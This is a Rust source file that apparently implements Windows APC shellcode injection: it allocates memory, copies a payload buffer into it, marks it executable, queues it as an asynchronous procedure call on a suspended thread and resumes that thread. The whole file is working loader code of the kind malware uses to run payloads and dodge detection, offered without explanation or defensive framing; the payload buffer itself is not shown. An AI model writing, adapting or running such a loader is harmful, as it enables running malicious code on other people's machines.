fn apc_inject(thread_handle: *mut c_void, shellcode: &[u8], shellcode_size: usize) -> bool {
    unsafe {
        let paddress = VirtualAlloc(
            null_mut(),
            shellcode_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if paddress.is_null() {
            println!("[-] VirtualAlloc failed with error: {}", GetLastError());
            return false;
        }

        println!("[+] Memory allocated at: {:p}", paddress);

        copy_nonoverlapping(shellcode.as_ptr(), paddress as *mut u8, shellcode_size);

        let mut old_protect = 0;

        if VirtualProtect(
            paddress,
            shellcode_size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        ) == 0
        {
            println!("[-] VirtualProtect failed with error: {}", GetLastError());
            return false;
        }

        if QueueUserAPC(Some(transmute(paddress)), thread_handle, 0) == 0 {
            println!("[-] QueueUserAPC failed with error: {}", GetLastError());
            return false;
        }
    }

    return true;
}

fn pause() {
    println!("[#] Press <Enter> To Continue ... ");
    io::stdout().flush().unwrap();
    let _ = io::stdin().read_line(&mut String::new());
}

fn main() {
    // let mut thread = std::ptr::null_mut();
    let mut thread_handle: *mut c_void = std::ptr::null_mut();

    let mut thread_id = 0;

    unsafe {
        let thread_handle = CreateThread(
            null_mut(),
            0,
            Some(dummyfn),
            null_mut(),
            CREATE_SUSPENDED,
            &mut thread_id,
        );
        if thread_handle.is_null() {
            println!("[-] CreateThread failed with error: {}", GetLastError());
            return;
        }

        if apc_inject(thread_handle, &BUF, BUF.len()) {
            println!("[+] APC injection successful!");
        } else {
            println!("[-] APC injection failed.");
        }

        if ResumeThread(thread_handle) == 0 {
            println!("[-] ResumeThread failed with error: {}", GetLastError());
        };

        WaitForSingleObject(thread_handle, 0xFFFFFFFF);

        pause();

        CloseHandle(thread_handle);
    }
}
